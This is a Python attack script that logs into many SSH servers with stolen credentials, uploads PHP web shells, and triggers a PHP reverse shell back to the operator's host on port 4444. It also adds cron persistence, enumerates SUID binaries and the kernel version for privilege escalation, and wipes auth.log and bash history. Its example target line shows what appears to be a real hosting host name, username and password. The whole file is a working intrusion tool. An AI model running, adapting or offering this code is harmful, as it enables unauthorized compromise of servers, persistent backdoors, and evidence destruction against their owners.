import paramiko
import sys
import time
import random
import concurrent.futures
import os
import logging
from cryptography.fernet import Fernet
from urllib.parse import urlparse
import requests
import re

# Hardcoded defaults for simple CLI usage
TARGETS_FILE = "ssh.txt"  # Format: host:port|username|password
REMOTE_DIR = "/var/www/html/" # Default web directory
SHELL_NAME = "uploader.php"   # Name of the uploaded shell
REVERSE_SHELL_NAME = "rev.php" # Name of reverse shell
REVERSE_HOST = "YOUR_IP"     # Ganti dengan IP lo untuk reverse shell
REVERSE_PORT = 4444          # Port untuk reverse shell
THREADS = 20                  # Max concurrent threads
RETRY_ATTEMPTS = 3            # Retry failed uploads
PROXY_POOL = []               # Add SOCKS5 proxies (e.g., ["socks5://127.0.0.1:9050"]) or leave empty

# Setup logging for attack replay
logging.basicConfig(filename='ssh_domination.log', level=logging.INFO, format='%(asctime)s - %(message)s')

def generate_encryption_key():
    return Fernet.generate_key()

def encrypt_shell(shell_content, key):
    fernet = Fernet(key)
    return fernet.encrypt(shell_content.encode())

def get_random_proxy():
    return random.choice(PROXY_POOL) if PROXY_POOL else None

def discover_web_path(ssh_client, host):
    try:
        stdin, stdout, stderr = ssh_client.exec_command("find / -type d -name 'html' 2>/dev/null")
        paths = stdout.read().decode().strip().split('\n')
        for path in paths:
            if '/var/www/html' in path or '/public_html' in path:
                print(f"[+] Discovered web path on {host}: {path}")
                logging.info(f"Discovered web path on {host}: {path}")
                return path + "/"
        return REMOTE_DIR
    except Exception as e:
        print(f"[-] Web path discovery failed on {host}: {str(e)}")
        logging.error(f"Web path discovery failed on {host}: {str(e)}")
        return REMOTE_DIR

def add_cron_persistence(ssh_client, host, shell_name, remote_dir):
    try:
        cron_cmd = f"curl http://{host}/{shell_name} >/dev/null 2>&1"
        cron_line = f"*/10 * * * * {cron_cmd}\n"
        ssh_client.exec_command(f"echo '{cron_line}' | crontab -")
        print(f"[+] Persistence added via cron on {host}")
        logging.info(f"Added cron persistence on {host}")
        return True
    except Exception as e:
        print(f"[-] Cron persistence failed on {host}: {str(e)}")
        logging.error(f"Cron persistence failed on {host}: {str(e)}")
        return False

def check_privilege_escalation(ssh_client, host):
    try:
        # Check kernel version
        stdin, stdout, stderr = ssh_client.exec_command("uname -r")
        kernel = stdout.read().decode().strip()
        print(f"[+] Kernel version on {host}: {kernel}")
        logging.info(f"Kernel version on {host}: {kernel}")
        
        # Check SUID binaries
        stdin, stdout, stderr = ssh_client.exec_command("find / -perm -4000 2>/dev/null")
        suid_bins = stdout.read().decode().strip().split('\n')
        if suid_bins and suid_bins[0]:
            print(f"[+] SUID binaries found on {host}: {suid_bins[:5]}...")
            logging.info(f"SUID binaries on {host}: {suid_bins}")
        return kernel, suid_bins
    except Exception as e:
        print(f"[-] Privilege escalation check failed on {host}: {str(e)}")
        logging.error(f"Privilege escalation check failed on {host}: {str(e)}")
        return None, []

def stealth_cleanup(ssh_client, host):
    try:
        # Clear SSH logs and bash history
        ssh_client.exec_command("echo '' > /var/log/auth.log 2>/dev/null")
        ssh_client.exec_command("echo '' > ~/.bash_history && history -c")
        print(f"[+] Stealth cleanup done on {host}")
        logging.info(f"Stealth cleanup done on {host}")
        return True
    except Exception as e:
        print(f"[-] Stealth cleanup failed on {host}: {str(e)}")
        logging.error(f"Stealth cleanup failed on {host}: {str(e)}")
        return False

def check_ssh_vuln(ssh_client, host):
    try:
        ssh_version = ssh_client.get_transport().remote_version
        print(f"[+] SSH version on {host}: {ssh_version}")
        logging.info(f"SSH version on {host}: {ssh_version}")
        
        # Simple CVE check (example: OpenSSH < 7.7 user enumeration)
        if "OpenSSH" in ssh_version:
            version = re.search(r"OpenSSH_([\d.]+)", ssh_version)
            if version and float(version.group(1)) < 7.7:
                print(f"[!] Potential CVE-2018-15473 (user enumeration) on {host}")
                logging.info(f"Potential CVE-2018-15473 on {host}")
                return "CVE-2018-15473"
        return None
    except Exception as e:
        print(f"[-] SSH vuln check failed on {host}: {str(e)}")
        logging.error(f"SSH vuln check failed on {host}: {str(e)}")
        return None

def ssh_upload_shell(host, port, username, password, encrypted_shell, key, encrypted_rev_shell, rev_key, remote_dir, shell_name, reverse_shell_name):
    for attempt in range(RETRY_ATTEMPTS):
        try:
            # Setup SSH client
            ssh_client = paramiko.SSHClient()
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Proxy support
            if PROXY_POOL:
                from paramiko import ProxyCommand
                proxy = get_random_proxy()
                ssh_client.connect(host, port=port, username=username, password=password, sock=ProxyCommand(f"socat - {proxy}"), timeout=15)
            else:
                ssh_client.connect(host, port=port, username=username, password=password, timeout=15)
            
            # Check SSH vuln
            vuln = check_ssh_vuln(ssh_client, host)
            
            # Auto-discover web path
            remote_dir = discover_web_path(ssh_client, host)
            
            # Decrypt and upload uploader shell
            fernet = Fernet(key)
            decrypted_shell = fernet.decrypt(encrypted_shell).decode()
            temp_local_shell = f"/tmp/{random.randint(1000,9999)}_{shell_name}"
            with open(temp_local_shell, 'w') as f:
                f.write(decrypted_shell)
            
            # Decrypt and upload reverse shell
            fernet_rev = Fernet(rev_key)
            decrypted_rev_shell = fernet_rev.decrypt(encrypted_rev_shell).decode()
            temp_local_rev_shell = f"/tmp/{random.randint(1000,9999)}_{reverse_shell_name}"
            with open(temp_local_rev_shell, 'w') as f:
                f.write(decrypted_rev_shell)
            
            # Upload both shells via SFTP
            sftp = ssh_client.open_sftp()
            sftp.put(temp_local_shell, f"{remote_dir}{shell_name}")
            sftp.put(temp_local_rev_shell, f"{remote_dir}{reverse_shell_name}")
            sftp.close()
            
            # Set permissions
            ssh_client.exec_command(f"chmod 644 {remote_dir}{shell_name}")
            ssh_client.exec_command(f"chmod 644 {remote_dir}{reverse_shell_name}")
            
            print(f"[+] Shell uploaded to {remote_dir}{shell_name} on {host}—fucking owned!")
            logging.info(f"Uploaded shell to {remote_dir}{shell_name} on {host} with {username}:{password}")
            print(f"[+] Reverse shell uploaded to {remote_dir}{reverse_shell_name} on {host}")
            logging.info(f"Uploaded reverse shell to {remote_dir}{reverse_shell_name} on {host}")
            
            # Verify uploader shell
            shell_url = f"http://{host}/{shell_name}"
            proxies = {'http': get_random_proxy(), 'https': get_random_proxy()} if PROXY_POOL else {}
            verify_response = requests.get(shell_url, proxies=proxies, verify=False, timeout=10)
            if 'SUCCESS' in verify_response.text:
                print(f"[+] Shell verified on {shell_url}: {verify_response.text[:100]}...")
                logging.info(f"Verification success on {shell_url}")
            
            # Trigger reverse shell
            requests.get(f"http://{host}/{reverse_shell_name}", proxies=proxies, verify=False, timeout=5)
            print(f"[+] Reverse shell triggered on http://{host}/{reverse_shell_name}—check listener on {REVERSE_HOST}:{REVERSE_PORT}")
            logging.info(f"Triggered reverse shell on http://{host}/{reverse_shell_name}")
            
            # Add cron for persistence
            add_cron_persistence(ssh_client, host, shell_name, remote_dir)
            
            # Check privilege escalation
            kernel, suid_bins = check_privilege_escalation(ssh_client, host)
            
            # Stealth cleanup
            stealth_cleanup(ssh_client, host)
            
            os.remove(temp_local_shell)
            os.remove(temp_local_rev_shell)
            ssh_client.close()
            return True
        
        except Exception as e:
            print(f"[-] Assault failed on {host} (Attempt {attempt+1}): {str(e)}")
            logging.error(f"Failed on {host}: {str(e)}")
            time.sleep(random.uniform(0.5, 3.0))
            continue
    
    print(f"[-] All {RETRY_ATTEMPTS} attempts failed on {host}")
    return False

def craft_malicious_shells():
    # Uploader shell (same as before)
    uploader_shell = """<?php
echo 'SUCCESS<pre>'.php_uname().'</pre>';
echo '<form method="post" enctype="multipart/form-data">';
echo '<input type="file" name="f"><input type="submit" value="Upload">';
echo '</form>';
if($_FILES['f']['name']){
    if(copy($_FILES['f']['tmp_name'], $_FILES['f']['name'])){
        echo 'Upload Success';
    }else{
        echo 'Upload Failed';
    }
}
?>"""
    
    # Reverse shell
    reverse_shell = f"""<?php
$host = '{REVERSE_HOST}';
$port = {REVERSE_PORT};
$sock = fsockopen($host, $port);
if ($sock) {{
    $descriptorspec = array(
        0 => $sock,
        1 => $sock,
        2 => $sock
    );
    $process = proc_open('/bin/sh', $descriptorspec, $pipes);
    while (!feof($sock)) {{
        fwrite($sock, fread(STDIN, 1024));
        echo fread($sock, 1024);
    }}
    proc_close($process);
    fclose($sock);
}}
?>"""
    
    key = generate_encryption_key()
    encrypted_shell = encrypt_shell(uploader_shell, key)
    rev_key = generate_encryption_key()
    encrypted_rev_shell = encrypt_shell(reverse_shell, rev_key)
    print(f"[+] Encrypted uploader shell ready—key: {key.decode()}")
    print(f"[+] Encrypted reverse shell ready—key: {rev_key.decode()}")
    return encrypted_shell, key, encrypted_rev_shell, rev_key

def load_targets(targets_file):
    targets = []
    if not os.path.exists(targets_file):
        print(f"[-] Error: {targets_file} not found! Create it with format: host:port|username|password")
        print(f"[!] Example: wpiix8.rumahweb.com:22|dv240385|kgn2015")
        logging.error(f"{targets_file} not found")
        sys.exit(1)
    
    if not os.access(targets_file, os.R_OK):
        print(f"[-] Error: Cannot read {targets_file}! Check permissions.")
        logging.error(f"Cannot read {targets_file} due to permissions")
        sys.exit(1)
    
    try:
        with open(targets_file, 'r', encoding='utf-8') as f:
            for i, line in enumerate(f, 1):
                line = line.strip()
                if not line:
                    continue
                parts = line.split('|')
                if len(parts) == 3:
                    host_port, username, password = parts
                    host, port = host_port.split(':') if ':' in host_port else (host_port, 22)
                    port = int(port)
                    targets.append((host, port, username, password))
                else:
                    print(f"[-] Invalid format at line {i}: {line}")
                    logging.error(f"Invalid format at line {i}: {line}")
    except UnicodeDecodeError:
        print("[!] UTF-8 decode error, trying latin1 encoding...")
        try:
            with open(targets_file, 'r', encoding='latin1') as f:
                for i, line in enumerate(f, 1):
                    line = line.strip()
                    if not line:
                        continue
                    parts = line.split('|')
                    if len(parts) == 3:
                        host_port, username, password = parts
                        host, port = host_port.split(':') if ':' in host_port else (host_port, 22)
                        port = int(port)
                        targets.append((host, port, username, password))
                    else:
                        print(f"[-] Invalid format at line {i}: {line}")
                        logging.error(f"Invalid format at line {i}: {line}")
        except Exception as e:
            print(f"[-] Target load error (latin1): {str(e)}")
            logging.error(f"Target load error (latin1): {str(e)}")
            sys.exit(1)
    except Exception as e:
        print(f"[-] Target load error: {str(e)}")
        logging.error(f"Target load error: {str(e)}")
        sys.exit(1)
    
    if not targets:
        print("[-] No valid targets loaded. Aborting mission.")
        logging.error("No valid targets loaded")
        sys.exit(1)
    return targets

if __name__ == "__main__":
    # Craft encrypted shells
    encrypted_shell, key, encrypted_rev_shell, rev_key = craft_malicious_shells()
    
    # Load targets
    targets = load_targets(TARGETS_FILE)
    
    # Launch the assault
    print(f"[+] Launching SSH domination on {len(targets)} targets with {THREADS} threads! 😈")
    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = [executor.submit(ssh_upload_shell, host, port, username, password, encrypted_shell, key, encrypted_rev_shell, rev_key, REMOTE_DIR, SHELL_NAME, REVERSE_SHELL_NAME) for host, port, username, password in targets]
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                print("[+] Target crushed! Logs updated.")
            else:
                print("[-] Target resisted... check logs.")
    
    print("[+] Operation complete—check ssh_domination.log for full intel!")